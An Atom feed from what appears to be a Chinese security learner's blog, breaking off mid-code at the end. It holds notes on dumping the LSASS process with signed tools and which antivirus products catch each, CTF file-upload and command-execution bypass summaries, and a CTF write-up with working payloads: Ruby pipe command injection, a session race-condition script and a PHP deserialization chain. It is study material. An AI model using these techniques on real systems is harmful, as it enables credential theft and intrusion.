<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xsheep</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-06-16T15:27:51.422Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Xsheep</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>dump Lsass进程</title>
    <link href="http://example.com/2024/06/16/lsass%E8%BF%9B%E7%A8%8B/"/>
    <id>http://example.com/2024/06/16/lsass%E8%BF%9B%E7%A8%8B/</id>
    <published>2024-06-16T14:47:16.674Z</published>
    <updated>2024-06-16T15:27:51.422Z</updated>
    
    <content type="html"><![CDATA[<h3 id="lsass进程"><a href="#lsass进程" class="headerlink" title="lsass进程"></a>lsass进程</h3><p>lsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略，存放着用户名和密码哈希和Kerberos票据等。</p><p>当木马上线的时候，尝试dump lsass进程来获取密码或者票据</p><img src="/2024/06/16/lsass%E8%BF%9B%E7%A8%8B/image-20240616225328470.png" class="" title="image-20240616225328470"><h3 id="白名单工具"><a href="#白名单工具" class="headerlink" title="白名单工具"></a>白名单工具</h3><h4 id="Procdump（被杀）"><a href="#Procdump（被杀）" class="headerlink" title="Procdump（被杀）"></a>Procdump（被杀）</h4><p>首先尝试procdump，以管理员权限执行</p><p><img src="C:\Users\支yuyang\AppData\Roaming\Typora\typora-user-images\image-20240616224654168.png" alt="image-20240616224654168"></p><p>defender直接报警</p><h4 id="ProcessExplorer（不行）"><a href="#ProcessExplorer（不行）" class="headerlink" title="ProcessExplorer（不行）"></a>ProcessExplorer（不行）</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="/2024/06/16/lsass%E8%BF%9B%E7%A8%8B/image-20240616225055757.png" class="" title="image-20240616225055757"></h4><p>拒绝访问</p><h4 id="SqlDumper-exe-被杀"><a href="#SqlDumper-exe-被杀" class="headerlink" title="SqlDumper.exe(被杀)"></a>SqlDumper.exe(被杀)</h4><p>sqlserver的dump工具 默认路径为 C:\Program Files\Microsoft SQL Server\100\Shared</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlDumper.exe PID 0 0x01100</span><br></pre></td></tr></table></figure><img src="/2024/06/16/lsass%E8%BF%9B%E7%A8%8B/image-20240616225617204.png" class="" title="image-20240616225617204"><p>被杀</p><h4 id="dump64-exe（被杀）"><a href="#dump64-exe（被杀）" class="headerlink" title="dump64.exe（被杀）"></a>dump64.exe（被杀）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dump64.exe 720 lsass.dmp</span><br></pre></td></tr></table></figure><img src="/2024/06/16/lsass%E8%BF%9B%E7%A8%8B/image-20240616231636880.png" class="" title="image-20240616231636880"><h4 id="DumpMiniTool-exe（可过火绒）"><a href="#DumpMiniTool-exe（可过火绒）" class="headerlink" title="DumpMiniTool.exe（可过火绒）"></a>DumpMiniTool.exe（可过火绒）</h4><p>携带Microsoft签名,是visual studio2022 的一个程序</p><p>默认路径为 C:\VisaulStudio\IDE\Common7\IDE\CommonExtensions\Microsoft\TestWindow\VsTest\Extensions\dump</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DumpMinitool.exe --file lsass.dmp --processID PID --dumpType Full</span><br></pre></td></tr></table></figure><img src="/2024/06/16/lsass%E8%BF%9B%E7%A8%8B/image-20240616230912451.png" class="" title="image-20240616230912451"><p>Defender会报警，即使dump成功，Defender也会删除dump后的文件</p><img src="/2024/06/16/lsass%E8%BF%9B%E7%A8%8B/image-20240616231346223.png" class="" title="image-20240616231346223"><p>360也会报警，火绒不会</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>目前只尝试了白名单的几个程序，不是被Defender查杀就是被360拦截</p><p>感觉得自己写代码实现，或者利用免杀的Mimikatz</p><p>初步探索一下，水平有待提高</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;lsass进程&quot;&gt;&lt;a href=&quot;#lsass进程&quot; class=&quot;headerlink&quot; title=&quot;lsass进程&quot;&gt;&lt;/a&gt;lsass进程&lt;/h3&gt;&lt;p&gt;lsass.exe是一个系统重要进程，用于微软Windows系统的安全机制。它用于本地安全和登陆策略</summary>
      
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>ctf文件上传小结</title>
    <link href="http://example.com/2023/06/28/ctf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/06/28/ctf%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</id>
    <published>2023-06-28T08:52:26.848Z</published>
    <updated>2024-06-15T03:58:27.707Z</updated>
    
    <content type="html"><![CDATA[<p>本文依据ctfshow 文件上传篇题目总结 ，后续仍会持续更新</p><h3 id="基本姿势"><a href="#基本姿势" class="headerlink" title="基本姿势"></a>基本姿势</h3><p>首先，文件上传类的题目基本思路是</p><p>上传一个木马文件，让服务器以php文件解析</p><p>这样就可以让文件携带任何恶意命令上传进去</p><h3 id="各种过滤及绕过方法"><a href="#各种过滤及绕过方法" class="headerlink" title="各种过滤及绕过方法"></a>各种过滤及绕过方法</h3><p>1.前端过滤:  最常见的就是前端过滤，限制上传文件的类型</p><p>​这种限制直接抓包，然后在包里修改文件类型即可</p><p>2.后端过滤; 后端过滤一般是过滤一些关键词，如 <code>php</code> , <code>eval</code> 等等</p><p>​过滤关键词的话，其实通过命令执行的训练 有很多方法可以达到想要的效果</p><p>​如果是过滤 php，那么正常的标签 <?php  ?>就无法使用</p><p>​可以考虑段标签绕过</p><p>​如  <code>&lt;?=  ?&gt;</code>      </p><p>​<code>&lt;script language=&#39;php&#39;&gt; system(&#39;ls&#39;);&lt;/script&gt;</code></p><p>3.将文件后缀改为php后，服务器不解析</p><p>​这时候可以考虑上传配置文件</p><p>​.hatcass  是apache 服务器上的配置文件</p><p>​.user.ini 是nginx 服务器上的配置文件</p><p>​这种配置文件，可以将指定文件或者指定类型的文件，以php格式解析</p><p>​     并且在执行命令前先包配置文件中指定文件 ，类似于 include(shell.php);</p><p>​那么就带来一个使用条件，就是，同一级目录下必须要有可以访问的php文件</p><p>​如 在upload目录下有index.php文件 </p><p>​那在上传完配置文件之后 ，访问 &#x2F;upload&#x2F;index.php 时，就会先解析木马文件</p><p>4.日志包含</p><p>​    如果后端过滤较为严格，各种执行命令的函数都被禁用</p><p>   这时候可以使用日志包含</p><p>   在上传的木马文件中 ，inlcude(&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log)  （以ngnix服务器为例）</p><p>   接着在访问 access.log 时，在 user-agent里写入一句话木马</p><p>​    蚁剑链接即可</p><p>5.软连接问题</p><p>​今年ciscn中有一道 unzip ，是上传压缩包</p><p>​软连接是linux中一个常用命令，类型于windows系统中的快捷方式</p><p>​它的功能是为某一个文件在另外一个位置建立一个同步的连接</p><p>​我们可以先创建一个 shell 文件夹</p><p>​<code>ln -s  /var/www/html   shell</code>     就创建了一个软连接</p><p>​此时，我们对 shell 文件夹的任何操作 ，都会作用到  &#x2F;var&#x2F;www&#x2F;html 文件夹下</p><p>​ 先将 shell 文件夹上传</p><p>​ 接着，我们在本地的 shell 文件夹下创建一个木马文件 1.php</p><p>​  再将 shell 文件夹上传 </p><p>​       此时，新的shell 会替代 旧的shell ，但是由于之前创建的软链接</p><p>​  我们 shell 文件夹下的 1.php 木马文件，也同样上传到了 &#x2F;var&#x2F;www&#x2F;html 文件夹中</p><p>​  此时，直接访问1.php 即可执行任意命令</p><p>小tip：可以在上传文件前  加上  GIF89a</p><p>​来达到绕过文件头的校验</p><p>​php中有一个  <code>getimagesize()</code> 函数， 通过识别文件头来识别文件的格式</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文依据ctfshow 文件上传篇题目总结 ，后续仍会持续更新&lt;/p&gt;
&lt;h3 id=&quot;基本姿势&quot;&gt;&lt;a href=&quot;#基本姿势&quot; class=&quot;headerlink&quot; title=&quot;基本姿势&quot;&gt;&lt;/a&gt;基本姿势&lt;/h3&gt;&lt;p&gt;首先，文件上传类的题目基本思路是&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>ctf命令执行小结</title>
    <link href="http://example.com/2023/06/27/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/06/27/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</id>
    <published>2023-06-27T09:27:58.103Z</published>
    <updated>2024-06-15T03:58:22.443Z</updated>
    
    <content type="html"><![CDATA[<p>个人持续总结中….</p><h3 id="1-基本姿势"><a href="#1-基本姿势" class="headerlink" title="1 基本姿势"></a>1 基本姿势</h3><p>php中提供了三个调用系统命令的函数 ，分别是  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system ，exec(&quot;shell&quot;)，passthru</span><br></pre></td></tr></table></figure><p>其中 ， <code>exec</code> 系统命令不返回执行结果 ，需配合 <code>echo</code> 使用 ， 如 <code>echo exec(&quot;ls&quot;);</code></p><p><code>echo exec(&quot;ls&quot;);</code>  也仅仅能返回最后一个数据 ，所以为了返回所有数据 ，可以使用 <code>shell_exec</code></p><p>闭合的 顿号 &#96;  也可以代替 exec 函数 ，不返回执行结果 ，需配合 echo 使用</p><h3 id="2-各种绕过以及其他命令"><a href="#2-各种绕过以及其他命令" class="headerlink" title="2 各种绕过以及其他命令"></a>2 各种绕过以及其他命令</h3><p>(1)cp命令：可将一个文件写入另一个文件 ，如 <code>cp flag.php 1.txt</code>  此时，1.txt文件中即可查看flag</p><p>(2)命令执行中的经典逃逸  </p><p>如果是<code>eval($c)</code>，并且是对 $c  进行了过滤</p><p>那么可以传参 <code>?c=eval($_GET[w]);&amp;w=system(&quot;shell&quot;);</code></p><p>此时，对c进行了过滤并没有检测到 system函数 ，w中的命令可以顺利执行</p><p>或者使用 <code>include</code>函数包含 </p><p>文件包含函数与 php伪协议一起使用，会被当成文件执行 ，如 <code>include</code> ，<code>file_get_contents</code> </p><p>传参</p><p>如果分号被过滤 ，可以使用 ?&gt; 代替</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[w]?&gt;&amp;w=data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>(3)基本字符绕过</p><p>​     空格绕过： %09 (tab键)，&#x2F; **&#x2F; (注释绕过)，$IFS$9 或者 ${IFS} (linux分隔符)，%0a (linux换行符) ，  &lt; 或者 &lt;&gt; 也可绕过空格</p><p>​通配符绕过：  *  和  ? , * 可代替多个字符 ，? 只能代替单个字符 </p><p>​在某种情况下 ， 可用 <code>/bin/c??</code> 来代替 cat 命令  </p><p>​ <code>/???/????64</code> 来匹配 <code>/bin/base64</code>     </p><p>​\ : linux中可以使用 \ 来表示连接  </p><p>​如果过滤了 flag  可以使用 fl \ag 来绕过  </p><p>(4)</p><p>如果题目进行了超级严格的过滤 ，各种系统命令都被禁用</p><p>那么考虑下面这种方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=print_r(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure><p>不是特别常见的函数</p><p><code>print_r()</code> 函数 打印变量</p><p><code>scandir()</code> 函数 返回指定目录中的文件和数组</p><p> <code>pos()</code> 函数 返回数组中的第一个元素的值</p><p><code>localeconv()</code>  函数 返回包含本地数字及货币格式信息的数组</p><p><code>array_reverse()</code>  函数 将数组元素倒过来</p><p>如果 <code>print_r()</code>  被禁用 ，可以使用 <code>var_dump()</code>函数来查看目录</p><p>或者 使用 <code>c=$a=scandir(&quot;/&quot;);echo $a[6];</code></p><p>上述函数可用来 查看目录</p><p>读取 flag 文件可以使用 <code>show_source()</code> 或者<code>highlight_file()</code>函数 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure><p>(5)无数字字母rce</p><p>当传入的变量 可以执行命令，但是过滤了数字和字母时</p><p>可以考虑接下来这种方案</p><p>先构造一个html脚本，传入shell文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;http://8f79b818-dffd-4d3e-bab6-7afde656b630.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">        &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>（注意修改url网址）</p><p>通过传入参数 ，使用 . 来执行文件</p><p>php 会将上传的临时文件保存在 &#x2F;tmp&#x2F;phpxxxxxx</p><p>如果 . &#x2F;tmp&#x2F;phpxxxxxx 即可执行该文件</p><p>根据 <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-list">p神</a> 的解释 ，如果使用 &#x2F;???&#x2F;?????? 可能会匹配到多个文件，无法正确执行</p><p>glob 中支持使用 [0-9] 的方式来表示一个范围 </p><p>而且干扰文件中所有文件名都是小写，只有PHP生产的临时文件包含大写字母</p><p>(补充：并不是所有文件的最后一个字符都是大写 ，因为文件名是随机生成，所以有时需要多试几次，直到文件名最后一位是大写为止)</p><p>在ASCII码表中， 大写字母位于 @ 和 [ 之间</p><p>那么，使用 &#x2F;???&#x2F;????????[@-[]  即可匹配到我们传入的临时文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;个人持续总结中….&lt;/p&gt;
&lt;h3 id=&quot;1-基本姿势&quot;&gt;&lt;a href=&quot;#1-基本姿势&quot; class=&quot;headerlink&quot; title=&quot;1 基本姿势&quot;&gt;&lt;/a&gt;1 基本姿势&lt;/h3&gt;&lt;p&gt;php中提供了三个调用系统命令的函数 ，分别是  &lt;/p&gt;
&lt;figure</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>2021第五空间Web复现</title>
    <link href="http://example.com/2023/05/30/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/"/>
    <id>http://example.com/2023/05/30/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/</id>
    <published>2023-05-29T16:17:11.518Z</published>
    <updated>2024-06-15T03:58:11.091Z</updated>
    
    <content type="html"><![CDATA[<h3 id="WebFTP"><a href="#WebFTP" class="headerlink" title="WebFTP"></a>WebFTP</h3><img src="/2023/05/30/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/image-20230603153358750.png" class="" title="image-20230603153358750"><p>dirsearch 扫描，扫出readme.md,里面有账户和密码</p><p>还有phpinfo.php,直接ctrl+f，phpinfo里有flag</p><h3 id="PNG图片转换器"><a href="#PNG图片转换器" class="headerlink" title="PNG图片转换器"></a>PNG图片转换器</h3><img src="/2023/05/30/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/image-20230603153445431.png" class="" title="image-20230603153445431"><p>题目给了两个路由，一个是上传，另一个是查询，题目给出了Ruby源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">require &#x27;sinatra&#x27;</span><br><span class="line">require &#x27;digest&#x27;</span><br><span class="line">require &#x27;base64&#x27;</span><br><span class="line"></span><br><span class="line">get &#x27;/&#x27; do</span><br><span class="line">  open(&quot;./view/index.html&quot;, &#x27;r&#x27;).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &#x27;/upload&#x27; do</span><br><span class="line">  open(&quot;./view/upload.html&quot;, &#x27;r&#x27;).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &#x27;/upload&#x27; do</span><br><span class="line">  unless params[:file] &amp;&amp; params[:file][:tempfile] &amp;&amp; params[:file][:filename] &amp;&amp; params[:file][:filename].split(&#x27;.&#x27;)[-1] == &#x27;png&#x27;</span><br><span class="line">    return &quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span><br><span class="line">  end</span><br><span class="line">  begin</span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + &#x27;.png&#x27;</span><br><span class="line">    open(filename, &#x27;wb&#x27;) &#123; |f|</span><br><span class="line">      f.write open(params[:file][:tempfile],&#x27;r&#x27;).read()</span><br><span class="line">    &#125;</span><br><span class="line">    &quot;Upload success, file stored at #&#123;filename&#125;&quot;</span><br><span class="line">  rescue</span><br><span class="line">    &#x27;something wrong&#x27;</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get &#x27;/convert&#x27; do</span><br><span class="line">  open(&quot;./view/convert.html&quot;, &#x27;r&#x27;).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post &#x27;/convert&#x27; do</span><br><span class="line">  begin</span><br><span class="line">    unless params[&#x27;file&#x27;]</span><br><span class="line">      return &quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span><br><span class="line">    end</span><br><span class="line"></span><br><span class="line">    file = params[&#x27;file&#x27;]</span><br><span class="line">    unless file.index(&#x27;..&#x27;) == nil &amp;&amp; file.index(&#x27;/&#x27;) == nil &amp;&amp; file =~ /^(.+)\.png$/</span><br><span class="line">      return &quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span><br><span class="line">    end</span><br><span class="line">    res = open(file, &#x27;r&#x27;).read()</span><br><span class="line">    headers &#x27;Content-Type&#x27; =&gt; &quot;text/html; charset=utf-8&quot;</span><br><span class="line">    &quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot; + Base64.encode64(res).gsub(/\s*/, &#x27;&#x27;) + &quot;\&quot;;\n&quot;</span><br><span class="line">  rescue</span><br><span class="line">    &#x27;something wrong&#x27;</span><br><span class="line">  end</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从源码里可以发现，上传文件类型只能是PNG类型。所以利用点在file.open()函数，</p><p>ruby file.open()命令执行：如果文件名是以管道符 |  开头，就会创建一个子进程，通过一个管道连接到调用者，该返回值可用于子进程的标准写入或标准输出</p><p>那么利用手法就是，先传一个png图片进去，然后使用&#x2F;convert路由查询时，文件名加管道符 | 开启子进程，进行命令执行，将flag写入上传的png图片</p><p>现在上传一个png图片，73527f0d156ad7b8fd8e7ea057ec422b.png</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=| `echo bHMgLw== | base64 -d` &gt; 73527f0d156ad7b8fd8e7ea057ec422b.png</span><br></pre></td></tr></table></figure><p>将根目录写入png图片，然后访问png图片，这里不知道为什么，根目录没有flag，读一下环境试试  cat &#x2F;proc&#x2F;self&#x2F;environ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| `echo Y2F0IC9wcm9jL3NlbGYvZW52aXJvbg== | base64 -d` &gt; 73527f0d156ad7b8fd8e7ea057ec422b.png</span><br></pre></td></tr></table></figure><p>再访问png图片，最终在环境里找到flag</p><img src="/2023/05/30/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/image-20230603153749440.png" class="" title="image-20230603153749440"><h3 id="EasyCleanup"><a href="#EasyCleanup" class="headerlink" title="EasyCleanup"></a>EasyCleanup</h3><p><img src="/../imgs/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230530112711006.png" alt="image-20230530112711006"></p><p>一共两个检测函数，filter函数过滤了一些关键词，checkNums函数限制了字母不能超过8个不同。</p><p>传参mode，如果mode&#x3D;eval，shell变量的值等于传入shell的值，不然等于phpinfo()，然后对shell判断，执行shell，这里没有过滤system，可以列出根目录</p><p><img src="/../imgs/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230530113035074.png" alt="image-20230530113035074"></p><p>可以看到nssctfasdasdflag就在根目录下，但是flag不同字母超过8个，shell命令是无法读取flag的</p><p>只能从file函数入手，但是filter函数过滤了冒号 ：，无法使用php伪协议，先读phpinfo，看看有没有可以利用的地方</p><p><img src="/../imgs/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230530113349114.png" alt="image-20230530113349114"></p><p>可以看到，session.use_strict_mode是关闭，session.auto_start也是关闭的,php不会自动初始化session，session.upload_progress.enabled打开，这就说明我们可以控制session的名称。</p><p>PHP将session以文件的形式存储在服务器中，默认是在&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions目录下，但是该题是在&#x2F;tmp目录下</p><p>这题开启了seesion.upload_progress.cleanup，所以需要session条件竞争写入文件，再通过include函数包含木马文件，进行命令执行</p><p>session 条件竞争 python脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">myurl = &#x27;http://node4.anna.nssctf.cn:28555&#x27;</span><br><span class="line">sessid = &#x27;7t0&#x27;</span><br><span class="line">myfile = io.BytesIO(b&#x27;hakaiisu&#x27; * 1024)</span><br><span class="line">writedata = &#123;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#x27;ls /&#x27;);?&gt;&quot;&#125;</span><br><span class="line">mycookie = &#123;&#x27;PHPSESSID&#x27;: sessid&#125;</span><br><span class="line"></span><br><span class="line">def writeshell(session):</span><br><span class="line">    while True:</span><br><span class="line">        resp = requests.post(url=myurl, data=writedata, files=&#123;&#x27;file&#x27;: (&#x27;hakaiisu.txt&#x27;, 123)&#125;, cookies=mycookie)</span><br><span class="line"></span><br><span class="line">def getshell(session):</span><br><span class="line">    while True:</span><br><span class="line">        payload_url = myurl + &#x27;?file=&#x27; + &#x27;/tmp/sess_&#x27; +sessid</span><br><span class="line">        resp = requests.get(url=payload_url)</span><br><span class="line">        if &#x27;upload_progress&#x27; in resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    session = requests.session()</span><br><span class="line">    writeshell = threading.Thread(target=writeshell, args=(session,))</span><br><span class="line">    writeshell.daemon = True</span><br><span class="line">    writeshell.start()</span><br><span class="line">    getshell(session)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终可以读到flag</p><h3 id="pklovecloud"><a href="#pklovecloud" class="headerlink" title="pklovecloud"></a>pklovecloud</h3><p><img src="/../imgs/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230531141710315.png" alt="image-20230531141710315"></p><p>php反序列化，主要是利用ace类里的file_get_contents函数来读取flag.php，要想触发这个函数，就要使得  openstack的neutron变量  &#x3D;&#x3D;&#x3D; nova变量，neutron变量被赋值 heat，openstack被unserialize docker；</p><p>利用思路：利用acp _construct函数，使得cinder变量为 acp类–&gt;触发toSting函数，执行echo_name —&gt; 在ace类里，通过给docker赋空值，绕过  neutron &#x3D;&#x3D;&#x3D; nova ，再给filename赋值  flag.php —-&gt; 最终执行 file_get_content 函数，读取flag文件</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class acp </span><br><span class="line">&#123;   </span><br><span class="line">    protected $cinder;  </span><br><span class="line">    public $neutron;</span><br><span class="line">    public $nova;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;cinder = new ace();</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class ace</span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $openstack;</span><br><span class="line">    public $docker; </span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;filename=&#x27;../../../../nssctfasdasdflag&#x27;;</span><br><span class="line">        $this-&gt;docker=&#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$a = new acp();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>注意，在NSS平台复现时，flag是在根目录。 </p><p>并且，cinder 是protected 类，在反序列化时 ，应在 *  左右 加上 </p><p>%00 * %00 或者 \00 * \00</p><h3 id="yet-another-mysql-injection"><a href="#yet-another-mysql-injection" class="headerlink" title="yet_another_mysql_injection"></a>yet_another_mysql_injection</h3><p><img src="/../imgs/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230603150125038.png" alt="image-20230603150125038"></p><p>源码有提示，访问source</p><p><img src="/../imgs/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230603150208316.png" alt="image-20230603150208316"></p><p>给出了后端检验代码</p><p>判断是只有当传入的password 等于 sql 搜索出来的password相等的时候，才会给出flag</p><p>爆破密码，payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 